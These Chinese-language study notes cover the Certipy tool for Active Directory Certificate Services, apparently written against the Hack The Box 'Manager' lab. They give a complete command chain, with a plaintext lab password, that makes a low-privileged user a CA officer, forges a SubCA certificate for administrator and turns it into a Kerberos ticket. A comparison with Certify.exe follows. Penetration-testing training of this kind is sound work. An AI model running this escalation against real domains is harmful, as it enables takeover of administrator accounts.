# windowsADCS-Certipy

## 介绍

Certipy是一款跨平台证书“发现-申请-认证-（有限）CA管理”全链路工具

## 一些参数

| 字段          | 作用                                       | 场景                                                         |
| ------------- | ------------------------------------------ | ------------------------------------------------------------ |
| -dns          | 往证书加DNS名（SAN的DNSNAME)               | 给机器/服务类身份用（HTTPS、主机身份）                       |
| -email        | 往证书放Email（SAN的rfc822Name或相关字段） | Email场景，SUBJECT_ALT_REQUIRE_EMAIL                         |
| -subject      | 直接指定证书的Subject                      | 取决于模板是否允许“申请者提供Subject”比如（ENROLLEE_SUPPLIES_SUBJECT） |
| -san/-atlname | 泛指Subject Alternative Name(SAN)相关字段  | UPN、DNS、Email本质都属于“身份替代名/扩展身份信息”的范畴     |



## 检查证书

certipy-ad find -ns '10.129.183.160' -dc-ip '10.129.183.160' -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout

## 添加管理证书身份

certipy-ad ca -ca 'manager-DC01-CA' -ns '10.129.183.160' -dc-ip '10.129.183.160' -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -add-officer 'raven'

## 请求证书

certipy-ad req -ca 'manager-DC01-CA' -ns '10.129.183.160' -dc-ip '10.129.183.160' -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -template 'SubCA' -upn 'administrator@manager.htb'

返回=有返回私钥+证书id

## 同意添加证书请求

certipy-ad ca -ca 'manager-DC01-CA' -ns '10.129.183.160' -dc-ip '10.129.183.160' -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -issue-request 26

-issue-request 证书id

## 取回证书

certipy-ad req -ca 'manager-DC01-CA' -ns '10.129.183.160' -dc-ip '10.129.183.160' -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -retrieve 26

-issue-request 证书id

成功返回pfx文件

## 用pfx证书请求TGT

certipy-ad auth -ns '10.129.183.160' -dc-ip '10.129.183.160' -pfx 'administrator.pfx'

可能需要调整为DC时间

sudo ntpdate -u dc

## Certify.exe VS Certipy

| 维度               | Certify.exe       | Certipy                  |
| ------------------ | ----------------- | ------------------------ |
| 作者               | GhostPack         | ly4k                     |
| 语言               | c#                | python                   |
| 运行平台           | Windows（受害机） | Linux/Windows（攻击机）  |
| 主要用途           | 枚举&申请证书     | 枚举、申请、认证、利用   |
| ADCS枚举           | 基本              | 非常完整（ESC1-ESC13)    |
| 危险模板识别       | 有（基础）        | 强（全覆盖、自动判）     |
| 证书申请           | ✔                 | ✔                        |
| 导出PFX            | ✔                 | ✔                        |
| 证书->Kerberos登录 | ×                 | ✔（PKINIT)               |
| NTLM->Cert滥用     | ×                 | ✔（部分场景）            |
| 自动化程度         | 低                | 高                       |
| CA配置管理         | ×                 | 有限（需已有CA管理权）   |
| 添加CA officer     | ×                 | 可以（前提有CA管理权限） |
| 隐蔽性             | 中（落地EXE）     | 高（远程、无落地）       |
| OSCP实用性         | 辅助              | 首选                     |
